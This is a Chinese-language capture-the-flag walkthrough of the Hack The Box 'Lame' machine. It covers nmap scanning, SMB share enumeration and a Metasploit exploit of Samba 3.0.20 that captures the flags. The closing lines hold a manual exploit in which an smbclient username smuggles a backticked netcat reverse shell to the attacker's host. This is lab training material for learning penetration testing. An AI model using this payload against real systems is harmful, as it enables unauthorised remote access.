# lame

```
nmap -sV -vv -sT --script vuln 10.129.192.173 > res.txt 2>&1
```



```
PORT    STATE SERVICE     REASON         VERSION
21/tcp  open  ftp         syn-ack ttl 63 vsftpd 2.3.4
22/tcp  open  ssh         syn-ack ttl 63 OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
139/tcp open  netbios-ssn syn-ack ttl 63 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn syn-ack ttl 63 Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

```

#### 发现开放了21，22，139，445端口。这里补充一个nmap的技巧，当我们想要更深入了解某一个服务的版本，比方说smb的服务版本。可以使用

```
ls /usr/share/nmap/scripts|grep {service name}
```

#### 我这里看了writeup使用了smb-enum-shares吗，正常的情况下应该对每一种可能出现漏洞的服务进行漏洞扫描。（比如vsftpd,openssh等等其他的服务，都需要仔细地对可能出现漏洞的每一个服务信息收集）

```
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-29 11:10 CST
Stats: 0:00:12 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 0.00% done
Stats: 0:00:12 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 0.00% done
Stats: 0:00:13 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 0.00% done
Stats: 0:00:13 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 0.00% done
Nmap scan report for 10.129.119.38
Host is up (0.24s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-enum-shares: 
|   account_used: <blank>
|   \\10.129.119.38\ADMIN$: 
|     Type: STYPE_IPC
|     Comment: IPC Service (lame server (Samba 3.0.20-Debian))
|     Users: 1
|     Max Users: <unlimited>
|     Path: C:\tmp
|     Anonymous access: <none>
|   \\10.129.119.38\IPC$: 
|     Type: STYPE_IPC
|     Comment: IPC Service (lame server (Samba 3.0.20-Debian))
|     Users: 1
|     Max Users: <unlimited>
|     Path: C:\tmp
|     Anonymous access: READ/WRITE
|   \\10.129.119.38\opt: 
|     Type: STYPE_DISKTREE
|     Comment: 
|     Users: 1
|     Max Users: <unlimited>
|     Path: C:\tmp
|     Anonymous access: <none>
|   \\10.129.119.38\print$: 
|     Type: STYPE_DISKTREE
|     Comment: Printer Drivers
|     Users: 1
|     Max Users: <unlimited>
|     Path: C:\var\lib\samba\printers
|     Anonymous access: <none>
|   \\10.129.119.38\tmp: 
|     Type: STYPE_DISKTREE
|     Comment: oh noes!
|     Users: 1
|     Max Users: <unlimited>
|     Path: C:\tmp
|_    Anonymous access: READ/WRITE

Nmap done: 1 IP address (1 host up) scanned in 106.91 seconds

```

#### 启动msfconsole，search  Samba 3.0.20-Debian，没有结果。扩大搜索范围search  Samba 3.0.20，找到对应漏洞利用模块。拿到靶机shell。

将shell升级为交互式shell，使用以下模块

```
use post/multi/manage/shell_to_meterpreter
sessions -l 
set session 1
run
cat /home/makis/user.txt
cat /root/root.txt
```

#### 总结：信息收集阶段一定要仔细，对每一个端口上运行的程序，程序的版本都要作记录。因为后续漏洞发现阶段需要用到程序的版本信息。附上不使用msf的漏洞利用命令

```
smbclient -U “/=\`nohup nc -e /bin/sh LHOST LPORT\`” -N -I target_ip 
```


